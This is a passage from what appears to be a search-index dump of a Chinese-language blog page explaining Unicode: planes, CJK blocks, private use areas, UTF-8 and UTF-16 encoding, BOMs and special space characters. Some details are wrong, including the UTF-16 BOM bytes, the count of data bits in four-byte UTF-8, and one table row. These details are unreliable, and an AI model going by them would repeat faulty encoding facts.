U+2B81F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55D\u533a\uff08CJK Unified Ideographs Extension D\uff09222 \u4e2a\u6c49\u5b57 U+2B820 ~ U+2CEAF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55E\u533a\uff08CJK Unified Ideographs Extension E\uff095762 \u4e2a\u6c49\u5b57 U+2CEB0 ~ U+2EBEF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55F\u533a\uff08CJK Unified Ideographs Extension F\uff097473 \u4e2a\u6c49\u5b57 U+2F800 ~ U+2FA1F\uff1a\u4e2d\u65e5\u97e9\u517c\u5bb9\u8868\u610f\u6587\u5b57\u589e\u8865\uff08CJK Compatibility Ideographs Supplement\uff09542 \u4e2a\u6c49\u5b57 TIP \u5e73\u9762\uff08\u7b2c\u4e09\u8f85\u52a9\u5e73\u9762\uff09 \u5df2\u5206\u914d U+30000 ~ U+3134F \u4e3a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55G\u533a\uff0c\u5305\u542b\u7532\u9aa8\u6587\u3001\u91d1\u6587\u3001\u5c0f\u7bc6\u3001\u4e2d\u56fd\u6218\u56fd\u65f6\u671f\u6587\u5b57\u7b49 SSP \u5e73\u9762\uff08\u7b2c\u5341\u56db\u8f85\u52a9\u5e73\u9762\uff09 \u5747\u4e3a\u63a7\u5236\u5b57\u7b26 U+E0000 ~ U+E007F\uff1a\u8bed\u8a00\u7f16\u7801\u6807\u7b7e\uff08Tags\uff09 U+E0100 ~ U+E01EF\uff1a\u5b57\u5f62\u53d8\u6362\u9009\u53d6\u5668\uff08Variation Selectors Supplement\uff09 \u79c1\u4eba\u4f7f\u7528\u533a Unicode \u4e2d\u4e00\u5171\u6709\u4e09\u4e2a\u79c1\u4eba\u4f7f\u7528\u533a\uff1a U+E000 ~ U+F8FF\uff1a\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 \u79c1\u4eba\u4f7f\u7528\u533a U+F0000 ~ U+FFFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a A \u533a U+100000 ~ U+10FFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a B \u533a \u4e00\u822c\u7528\u4e8e\u67d0\u4e9b\u6807\u51c6\u6765\u89c4\u5b9a Unicode \u6807\u51c6\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u4f8b\u5982 GB/T 20542-2006\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55A\u201d\uff09\u548c GB/T 22238-2008\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55B\u201d\uff09\u4f7f\u7528\u79c1\u4eba\u4f7f\u7528\u533a\u5b58\u653e\u85cf\u6587\u8fde\u5b57 \u7f16\u7801 \u00b6 Unicode \u6709\u4e24\u79cd\u5b57\u7b26\u6620\u5c04\u65b9\u5f0f\uff0cUTF\uff08Unicode Transformation Format\uff09\u7f16\u7801\u548c UCS\uff08Universal Coded Character Set\uff09\u7f16\u7801\uff0c\u5177\u4f53\u6765\u8bf4\u6709 UCS-2\u3001UCS-4\u3001UTF-1\u3001UTF-8\u3001UTF-16\u3001UTF-32 \u7b49 UCS \u00b6 UCS-2 \uff0cUniversal Character Set coded in 2 octets\uff0c\u5373\u7528\u4e24\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u8303\u56f4\u4ece U+0000 \u5230 U+FFFF\u3002\u4e5f\u5c31\u662f\u8bf4 UCS-2 \u53ea\u80fd\u8868\u793a BMP \u5e73\u9762\u4e0a\u7684\u5b57\u7b26 UCS-4 \uff0c\u540c\u7406\uff0c\u7528\u56db\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u4ece U+00000000 \u5230 U+FFFFFFFF\uff0c\u53ef\u4ee5\u8868\u793a\u6240\u6709 Unicode \u5b57\u7b26\uff08UCS-4 \u4e0e UTF-32 \u5b8c\u5168\u7b49\u4ef7\uff09 \u4f46\u662f\u8fd9\u4e24\u79cd\u65b9\u6848\u90fd\u4f1a\u5bfc\u81f4\u7f16\u7801\u540e\u6709\u5927\u91cf\u7684 0x00 \u5b57\u8282\uff0c\u5360\u7a7a\u95f4\uff0c\u6240\u4ee5\u4e5f\u5c31\u6709\u4e86\u53ef\u53d8\u957f\u5ea6\u7684 UTF \u7f16\u7801 UTF-8 \u00b6 UTF-8 \u7f16\u7801\u662f\u76ee\u524d\u6700\u5e38\u7528\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5b83\u662f\u4e00\u4e2a\u53ef\u53d8\u5bbd\u5ea6\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u503c\u4f1a\u88ab\u7f16\u7801\u4e3a 1 \u5230 4 \u4e2a\u5b57\u8282 \u5177\u4f53\u6309\u7167\u4e0b\u9762\u7684\u7f16\u7801\u65b9\u5f0f\uff1a \u5b57\u7b26\u503c\u8303\u56f4 \u7b2c\u4e00\u5b57\u8282 \u7b2c\u4e8c\u5b57\u8282 \u7b2c\u4e09\u5b57\u8282 \u7b2c\u56db\u5b57\u8282 U+0000 ~ U+007F 0 xxxxxxx U+0080 ~ U+07FF 110 xxxxx 10 xxxxxx U+0800 ~ U+FFFF 1110 xxxx 10 xxxxxx 10 xxxxxx U+10000 ~ U+10FFFF 11110 xxx 10 xxxxxx 10 xxxxxx 10 xxxxxxx \u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u5b57\u8282\u90fd\u662f\u7531\u5f00\u5934\u7684\u51e0\u4e2a\u6bd4\u7279\u524d\u7f00\u548c\u5269\u4f59\u7684\u6570\u636e\u90e8\u5206\u7ec4\u6210\u7684 0\uff1a\u5f53\u524d\u8fd9\u4e00\u4e2a\u5b57\u8282\u5c31\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u503c 110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e24\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e00\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 1110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e09\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e24\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 11110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u56db\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e09\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 10\uff1a\u5f53\u524d\u5b57\u8282\u662f\u4e00\u4e2a\u5b57\u7b26\u503c\u7684\u4e00\u90e8\u5206 \u4e5f\u53ef\u4ee5\u53d1\u73b0\uff0c\u56db\u4e2a\u5b57\u8282\u65f6\u5269\u4f59\u7684\u6570\u636e\u6bd4\u7279\u4e3a 12 \u4e2a\uff0c\u6b63\u597d\u662f Unicode \u89c4\u5b9a\u7684\u6700\u5927\u5bb9\u91cf \u4e5f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b\u7279\u70b9\uff1a U+0000 ~ U+007F \u8fd9 128 \u4e2a\u5b57\u7b26\u503c\u5168\u90e8\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a\u5b57\u8282\u6765\u8868\u793a\uff0c\u5e76\u4e14\u524d\u7f00\u4e3a 0\uff0c\u5373\u7f16\u7801\u540e\u7684\u5b57\u8282\u503c\u548c\u5b57\u7b26\u503c\u76f8\u540c\u3002\u800c\u4e14\u8fd9 128 \u4e2a\u5b57\u7b26\u6b63\u597d\u662f ASCII \u7f16\u7801\u4e2d\u89c4\u5b9a\u7684\u5b57\u7b26\uff0c\u4f7f\u5f97 UTF-8 \u7f16\u7801\u5b8c\u5168\u517c\u5bb9 ASCII \u7f16\u7801 \u5728 BMP \u5e73\u9762\u4e2d\u7684 CJK \u5b57\u7b26\u90fd\u4f1a\u7f16\u7801\u4e3a 3 \u4e2a\u5b57\u8282 BMP \u5e73\u9762\u4f1a\u7f16\u7801\u4e3a 1~3 \u4e2a\u5b57\u8282\uff0c\u800c\u5269\u4f59\u7684\u5176\u4ed6\u5e73\u9762\u5747\u4f1a\u7f16\u7801\u4e3a 4 \u4e2a\u5b57\u8282 UTF-8 with BOM \u00b6 BOM\uff08Byte Order Mark\uff09\u5b57\u8282\u5e8f\u6807\u8bb0\u5728 UTF-8 \u7f16\u7801\u4e2d\u662f\u6ca1\u6709\u7528\u5904\u7684\uff0c\u4e5f\u4e0d\u63a8\u8350\uff0c\u5982\u679c\u5728\u6587\u4ef6\u5934\u5b58\u5728\u5219\u76f4\u63a5\u5ffd\u7565 UTF-8 \u7684 BOM \u548c UTF-16 \u7684 BOM \u5b57\u7b26\u503c\u4e00\u6837\u4e3a U+FEFF\uff0c\u7f16\u7801\u4e3a UTF-8 \u5373\u4e3a 0xEF 0xBB 0xBF \u4e09\u4e2a\u5b57\u8282\u3002\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u5b58\u5728\u4e8e\u6587\u4ef6\u5934\uff0c\u5219\u8868\u660e\u4e86\u8fd9\u4e2a\u6587\u4ef6\u4ee5 UTF-8 \u7f16\u7801\uff0c\u5e76\u4e14\u8fd9\u4e09\u4e2a\u5b57\u7b26\u5e94\u8be5\u76f4\u63a5\u5ffd\u7565 UTF-16 \u00b6 UTF-16 \u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\u7684\uff0c\u5b83\u5c06\u4e00\u4e2a\u5b57\u7b26\u503c\u7f16\u7801\u4e3a 1~2 \u4e2a 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff08\u5373 2 \u6216 4 \u4e2a\u5b57\u8282\uff09 \u5b83\u7684\u7f16\u7801\u65b9\u5f0f\u5206\u4e3a\u4e24\u7c7b\uff1a U+0000 ~ U+FFFF \u8303\u56f4 BMP \u7684\u5168\u90e8\u90e8\u5206\uff0c\u7f16\u7801\u503c\u548c\u7801\u4f4d\u76f8\u540c\uff0c\u5373\u76f4\u63a5\u5c06\u7801\u4f4d\u4f5c\u4e3a\u4e24\u4e2a\u5b57\u8282\u7684\u7f16\u7801 U+10000 ~ U+10FFFF \u8303\u56f4 \u6240\u6709\u7684\u8f85\u52a9\u5e73\u9762\u4e0a\u7684\u7801\u4f4d\u4f1a\u88ab\u7f16\u7801\u4e3a\u4e00\u5bf9 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff0c\u79f0\u4e3a\u4ee3\u7406\u5bf9\uff08Surrogate Pair\uff09 \u7801\u4f4d\u51cf 0x10000\uff0c\u4f7f\u8303\u56f4\u843d\u5728 0x00000 \u5230 0xFFFFF\uff0c\u5373 20 \u6bd4\u7279 \u9ad8\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xD800 \u5f97\u5230\u7b2c\u4e00\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u9ad8\u4f4d\u4ee3\u7406\uff08high surrogate\uff09\u6216\u524d\u5bfc\u4ee3\u7406\uff08lead surrogate\uff09 \u4f4e\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xDC00 \u5f97\u5230\u7b2c\u4e8c\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u4f4e\u4f4d\u4ee3\u7406\uff08low surrogate\uff09\u6216\u540e\u5c3e\u4ee3\u7406\uff08trail surrogate\uff09 \u8fd9\u6837\u7f16\u7801\u4e4b\u540e\u9ad8\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xD800 ~ 0xDBFF\uff0c\u4f4e\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xDC00 ~ 0xDFFF \u800c U+D800 ~ U+DFFF \u8fd9\u4e9b\u7801\u4f4d\u5728 BMP \u4e2d\u5df2\u7ecf\u9884\u7559\u4e86\u51fa\u6765\u4e0d\u8868\u793a\u4efb\u4f55\u5b57\u7b26\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u90e8\u5206\u662f\u4e0d\u4f1a\u91cd\u53e0\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bc6\u522b\u51fa\u6765\u662f\u600e\u4e48\u7f16\u7801\u7684 UTF-16 \u4e0e UTF-8 \u76f8\u6bd4\uff0c\u597d\u5904\u662f\u5927\u90e8\u5206\u5b57\u7b26\u90fd\u53ef\u4ee5\u7f16\u7801\u4e3a\u56fa\u5b9a\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u800c\u574f\u5904\u4e5f\u5f88\u660e\u663e\uff0c\u5b83\u4e0e ASCII \u5b8c\u5168\u4e0d\u517c\u5bb9 UTF-16 \u7f16\u7801\u6a21\u5f0f \u00b6 UTF-16 \u53ef\u4ee5\u4f7f\u7528\u5927\u7aef\u5e8f\u548c\u5c0f\u7aef\u5e8f\uff0c\u5728\u6587\u4ef6\u5f00\u5934\u4f1a\u6709 BOM\uff08U+FEFF\uff09\u6765\u6307\u660e\u5230\u5e95\u662f\u54ea\u4e2a\u6a21\u5f0f\uff08\u5982\u679c\u6ca1\u6709\uff0c\u5219\u9700\u8981\u731c\u6d4b\uff09 \u5c0f\u7aef\u5e8f\uff08UTF-16 LE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xFF 0xEF \u5927\u7aef\u5e8f\uff08UTF-16 BE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xEF 0xFF \u90e8\u5206\u7279\u6b8a\u5b57\u7b26 \u00b6 \u7a7a\u683c \u00b6 Unicode \u4e2d\u7684\u7a7a\u683c\u4e5f\u6709\u5f88\u591a\u79cd\uff0c\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u5bbd\u5ea6\u3001\u4ee5\u53ca\u610f\u4e49\uff08\u4e00\u4e9b\u96f6\u5bbd\u5b57\u7b26\u4e5f\u63a5\u5728\u8868\u540e\u9762\u4e86\uff09 [data-md-color-scheme=\"default\"] .space { white-space: pre; padding: 0; background-color: #000000DE; display: inline-block; line-height: 1; } [data-md-color-scheme=\"slate\"] .space { white-space: pre; padding: 0; background-color: #FFFFFFE6; display: inline-block; line-height: 1; } \u7801\u4f4d \u540d\u79f0 \u5bbd\u5ea6 \u610f\u4e49/\u7528\u9014 U+0020 SPACE ASCII \u7a7a\u683c\uff0c\u76f4\u63a5\u6253\u7a7a\u683c\u5c31\u662f\u8fd9\u4e2a U+00A0 NO-BREAK SPACE \u548c U+0020 \u7c7b\u4f3c\uff0c\u4f46\u662f\u4e0d\u4f1a\u65ad\u884c\uff0cHTML \u5b9e\u4f53 &nbsp; U+1680 OGHAM SPACE MARK \u1680 \u6b27\u7518\u6587\u7a7a\u683c U+2000 EN QUAD \u2002 \u534a\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2002 \u66ff\u4ee3 U+2001 EM QUAD \u2003 \u5168\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2003 \u66ff\u4ee3 U+2002 EN SPACE \u2002 \u534a\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &ensp; U+2003 EM SPACE \u2003 \u5168\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &emsp; U+2004 THREE-PER-EM SPACE \u2004 \u4e09\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/3\uff0c &emsp13; U+2005 FOUR-PER-EM SPACE \u2005 \u56db\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/4\uff0c &emsp14; U+2006 SIX-PER-EM SPACE \u2006 \u516d\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/6 U+2007 FIGURE SPACE \u2007 \u6570\u5b57\u7a7a\u683c\uff0c\u5728\u6709\u7b49\u5bbd\u6570\u5b57\u7684\u5b57\u4f53\u4e2d\u5bbd\u5ea6\u548c\u4e00\u4e2a\u6570\u5b57\u5bbd\u5ea6\u4e00\u81f4\uff0c &numsp; U+2008 PUNCTUATION SPACE \u2008 \u7b26\u53f7\u7a7a\u683c\uff0c\u4e0e\u7a84\u6807\u70b9\u7b26\u53f7\u5bbd\u5ea6\u4e00\u81f4\uff0c &puncsp; U+2009 THIN SPACE \u2009 \u8584\u7a7a\u683c\uff0c\u5bbd\u5ea6\u4e0d\u56fa\u5b9a\uff0c &thinsp; U+200A HAIR SPACE \u200a \u5934\u53d1\u7a7a\u683c\uff0c\u6bd4\u8584\u7a7a\u683c\u66f4\u7a84\uff0c &hairsp; U+202F NARROW NO-BREAK SPACE \u202f \u7a84\u7684\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u5728\u8499\u53e4\u8bed\u4e2d\u5bbd\u5ea6\u7c7b\u4f3c\u4e09\u5206\u5bbd\uff0c\u5176\u4ed6\u7c7b\u4f3c U+2009 U+205F MEDIUM MATHEMATICAL SPACE \u205f \u4e2d\u7b49\u6570\u5b66\u7a7a\u683c\uff0c4/18\u5bbd\uff0c\u7528\u4e8e\u6570\u5b66\u516c\u5f0f\u4e2d\u7b26\u53f7\u4e24\u4fa7\uff0c &MediumSpace; U+3000 IDEOGRAPHIC SPACE \u3000 \u8868\u610f\u7a7a\u683c\uff0cCJK \u8868\u610f\u6587\u5b57\u4f7f\u7528\u7684\u5168\u89d2\u7a7a\u683c U+200B ZERO WIDTH SPACE \u96f6\u5bbd\u7a7a\u683c\uff0c &ZeroWidthSpace; U+200C ZERO WIDTH NON-JOINER \u96f6\u5bbd\u4e0d\u8fde\u5b57\uff0c\u7528\u6765\u963b\u6b62\u5e26\u8fde\u5b57\u5b57\u4f53\u7684\u8fde\u5b57\uff0c &zwnj; U+200D ZERO WIDTH JOINER \u96f6\u5bbd\u8fde\u5b57\uff0c\u53ef\u4ee5\u8bf1\u5bfc\uff08\u5982\u8868\u60c5\u7b26\u53f7\u548c\u50e7\u4f3d\u7f57\u8bed\uff09\u6216\u6291\u5236\uff08\u5982\u68b5\u6587\uff09\u7528\u5355\u4e2a\u5b57\u5f62\u66ff\u6362\uff0c &zwj; U+2060 WORD JOINER \u96f6\u5bbd\u8bcd\u8fde\u63a5\u7b26\uff0c\u4e0d\u4f1a\u5728\u8bcd\u95f4\u65ad\u884c\uff0c &NoBreak; U+FEFF ZERO WIDTH NO-BREAK SPACE \u96f6\u5bbd\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u73b0\u7528\u4f5c\u6807\u8bb0\u5927\u5c0f\u7aef\u5e8f \u6a2a\u7ebf \u00b6 \u8be6\u89c1 \u4e0d\u79bb\u4e0d\u5f03\u7684\u7834\u6298\u53f7 - The Type","title":"Unicode"},{"location":"cs/unicode/#unicode","text":"Unicode\uff08\u522b\u540d Universal coded character set (UCS)\uff09\uff0c\u5b98\u65b9\u4e2d\u6587\u540d\u79f0\u4e3a\u7edf\u4e00\u7801\uff0c\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u7684\u4e1a\u754c\u6807\u51c6\u3002\u5b83\u6574\u7406\u3001\u7f16\u7801\u4e86\u4e16\u754c\u4e0a\u5927\u90e8\u5206\u7684\u6587\u5b57\u7cfb\u7edf\uff0c\u4f7f\u5f97\u7535\u8111\u53ef\u4ee5\u7528\u66f4\u4e3a\u7b80\u5355\u7684\u65b9\u5f0f\u6765\u5448\u73b0\u548c\u5904\u7406\u6587\u5b57\u3002 Unicode \u4f34\u968f\u7740\u901a\u7528\u5b57\u7b26\u96c6\u7684\u6807\u51c6\u800c\u53d1\u5c55\uff0c\u540c\u65f6\u4e5f\u4ee5\u4e66\u672c\u7684\u5f62\u5f0f\u5bf9\u5916\u53d1\u8868\u3002Unicode \u81f3\u4eca\u4ecd\u5728\u4e0d\u65ad\u589e\u4fee\uff0c\u6bcf\u4e2a\u65b0\u7248\u672c\u90fd\u52a0\u5165\u66f4\u591a\u65b0\u7684\u5b57\u7b26\u3002\u76ee\u524d\u6700\u65b0\u7684\u7248\u672c\u4e3a 2021 \u5e74 9 \u6708\u516c\u5e03\u7684 14.0.0\uff0c\u5df2\u7ecf\u6536\u5f55\u8d85\u8fc714\u4e07\u4e2a\u5b57\u7b26\uff08\u7b2c\u5341\u4e07\u4e2a\u5b57\u7b26\u5728 2005 \u5e74\u83b7\u91c7\u7eb3\uff09\u3002Unicode \u9664\u4e86\u89c6\u89c9\u4e0a\u7684\u5b57\u5f62\u3001\u7f16\u7801\u65b9\u6cd5\u3001\u6807\u51c6\u7684\u5b57\u7b26\u7f16\u7801\u8d44\u6599\u5916\uff0c\u8fd8\u5305\u542b\u4e86\u5b57\u7b26\u7279\u6027\uff08\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\uff09\u3001\u4e66\u5199\u65b9\u5411\u3001\u62c6\u5206\u6807\u51c6\u7b49\u7279\u6027\u7684\u8d44\u6599\u5e93\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u4e00\u76f4\u89c9\u5f97 Unicode \u548c UTF-8 \u7f16\u7801\u5f88\u6709\u610f\u601d\uff0c\u5c31\u770b\u4e86\u770b Unicode \u5b98\u7f51 Unicode \u5b57\u7b26\u767e\u79d1\uff08\u4e2d\u6587\uff09 Unicode \u6807\u51c6\uff1aISO/IEC 10646:2020 ISO/IEC 10646:2020 \u5b98\u65b9\u5f00\u653e\u4e0b\u8f7d\u5730\u5740","title":"Unicode \u7edf\u4e00\u7801"},{"location":"cs/unicode/#unicode_1","text":"Unicode \u7684\u5b57\u7b26\u96c6\u4ee5\u5206\u7ec4\u7684\u5f62\u5f0f\u8fdb\u884c\u7f16\u6392\uff0c\u6574\u4f53\u5206\u4e3a 17 \u4e2a\u5e73\u9762\uff08Plane\uff09 \u6bcf\u4e2a\u5e73\u9762\u4e2d\u6709 \\(2^{16}\\) \u4e2a\u7801\u4f4d\uff08codepoint\uff09\uff0c\u5373\u53ef\u4ee5\u5305\u542b 65536 \u4e2a\u5b57\u7b26\uff0c\u6574\u4f53\u6700\u591a\u53ef\u4ee5\u5305\u542b 111w+ \u4e2a\u5b57\u7b26\uff0c\u4f46\u76ee\u524d\u53ea\u4f7f\u7528\u4e86\u5c11\u6570\u5e73\u9762\u5171 14w+ \u4e2a\u5b57\u7b26 Unicode \u5b57\u7b26\u96c6\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u90fd\u6709\u4e00\u4e2a\u7f16\u53f7\uff0c\u5373\u5b57\u7b26\u503c\u3002\u5316\u4e3a\u5341\u516d\u8fdb\u5236\u540e\u540e\u56db\u4f4d\u4e3a\u5728\u5f53\u524d\u5e73\u9762\u4e0a\u7684\u7801\u503c\uff0c\u524d\u9762\u5269\u4f59\u7684\u4e3a\u5e73\u9762\u7f16\u53f7 \u6bd4\u5982 \"\u9e64\" \u8fd9\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u503c\u662f 0x9E64\uff0c\u8868\u793a\u4e3a U+9E64","title":"Unicode \u5b57\u7b26\u96c6"},{"location":"cs/unicode/#_1","text":"\u5e73\u9762\u7f16\u53f7 \u5b57\u7b26\u503c\u8303\u56f4 \u540d\u79f0 0 U+0000 ~ U+FFFF BMP \uff08Basic Multilingual Plane\uff09\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 1 U+10000 ~ U+1FFFF SMP \uff08Supplementary Multilingual Plane\uff09\u591a\u6587\u79cd\u8865\u5145\u5e73\u9762 2 U+20000 ~ U+2FFFF SIP \uff08Supplementary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u8865\u5145\u5e73\u9762 3 U+30000 ~ U+3FFFF TIP \uff08Tertiary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u7b2c\u4e09\u5e73\u9762 4~13 U+40000 ~ U+DFFFF Reserved Planes \u5c1a\u672a\u4f7f\u7528 14 U+E0000 ~ U+EFFFF SSP \uff08Supplementary Special-purpose Plane\uff09\u7279\u522b\u7528\u9014\u8865\u5145\u5e73\u9762 15 U+F0000 ~ U+FFFFF PUA-A \uff08Private Use Area-A\uff09\u79c1\u4eba\u4f7f\u7528\u533a A \u533a 16 U+100000 ~ U+10FFFF PUA-B \uff08Private Use Area-B\uff09\u79c1\u4eba\u4f7f\u7528\u533a B \u533a BMP \u5e73\u9762\uff08\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762\uff09 \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SMP \u5e73\u9762\uff08\u7b2c\u4e00\u8f85\u52a9\u5e73\u9762\uff09 \u4e3b\u8981\u6446\u653e\u7edd\u5927\u591a\u6570\u53e4\u4ee3\u6587\u5b57\uff0c\u73b0\u65f6\u5df2\u4e0d\u518d\u4f7f\u7528\u6216\u5f88\u5c11\u4f7f\u7528\u6587\u5b57\u3001\u901f\u8bb0\u3001\u6570\u5b66\u5b57\u6bcd\u7b26\u53f7\u3001\u97f3\u7b26\u3001\u56fe\u5f62\u7b26\u53f7\u53ca\u7528\u4e8e\u5b66\u8005\u7684\u4e13\u4e1a\u8bba\u6587\u4e2d\u4f7f\u7528\u7684\u53e4\u8001\u6216\u8fc7\u65f6\u7684\u8bed\u8a00\u4e66\u5199\u7b26\u53f7\uff0c\u4ee5\u53ca emoji \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u7b2c\u4e00\u8f85\u52a9\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SIP \u5e73\u9762\uff08\u7b2c\u4e8c\u8f85\u52a9\u5e73\u9762\uff09 \u5168\u4e3a CJK \u5b57\u7b26\uff0c\u5305\u542b\u5c11\u7528\u7684\u6c49\u5b57\u4ee5\u53ca\u67d0\u4e9b\u65b9\u8a00\u6587\u5b57 U+20000 ~ U+2A6DF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55B\u533a\uff08CJK Unified Ideographs Extension B\uff0943253 \u4e2a\u6c49\u5b57 U+2A700 ~ U+2B73F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55C\u533a\uff08CJK Unified Ideographs Extension C\uff094149 \u4e2a\u6c49\u5b57 U+2B740 ~ U+2B81F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55D\u533a\uff08CJK Unified Ideographs Extension D\uff09222 \u4e2a\u6c49\u5b57 U+2B820 ~ U+2CEAF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55E\u533a\uff08CJK Unified Ideographs Extension E\uff095762 \u4e2a\u6c49\u5b57 U+2CEB0 ~ U+2EBEF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55F\u533a\uff08CJK Unified Ideographs Extension F\uff097473 \u4e2a\u6c49\u5b57 U+2F800 ~ U+2FA1F\uff1a\u4e2d\u65e5\u97e9\u517c\u5bb9\u8868\u610f\u6587\u5b57\u589e\u8865\uff08CJK Compatibility Ideographs Supplement\uff09542 \u4e2a\u6c49\u5b57 TIP \u5e73\u9762\uff08\u7b2c\u4e09\u8f85\u52a9\u5e73\u9762\uff09 \u5df2\u5206\u914d U+30000 ~ U+3134F \u4e3a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55G\u533a\uff0c\u5305\u542b\u7532\u9aa8\u6587\u3001\u91d1\u6587\u3001\u5c0f\u7bc6\u3001\u4e2d\u56fd\u6218\u56fd\u65f6\u671f\u6587\u5b57\u7b49 SSP \u5e73\u9762\uff08\u7b2c\u5341\u56db\u8f85\u52a9\u5e73\u9762\uff09 \u5747\u4e3a\u63a7\u5236\u5b57\u7b26 U+E0000 ~ U+E007F\uff1a\u8bed\u8a00\u7f16\u7801\u6807\u7b7e\uff08Tags\uff09 U+E0100 ~ U+E01EF\uff1a\u5b57\u5f62\u53d8\u6362\u9009\u53d6\u5668\uff08Variation Selectors Supplement\uff09 \u79c1\u4eba\u4f7f\u7528\u533a Unicode \u4e2d\u4e00\u5171\u6709\u4e09\u4e2a\u79c1\u4eba\u4f7f\u7528\u533a\uff1a U+E000 ~ U+F8FF\uff1a\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 \u79c1\u4eba\u4f7f\u7528\u533a U+F0000 ~ U+FFFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a A \u533a U+100000 ~ U+10FFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a B \u533a \u4e00\u822c\u7528\u4e8e\u67d0\u4e9b\u6807\u51c6\u6765\u89c4\u5b9a Unicode \u6807\u51c6\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u4f8b\u5982 GB/T 20542-2006\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55A\u201d\uff09\u548c GB/T 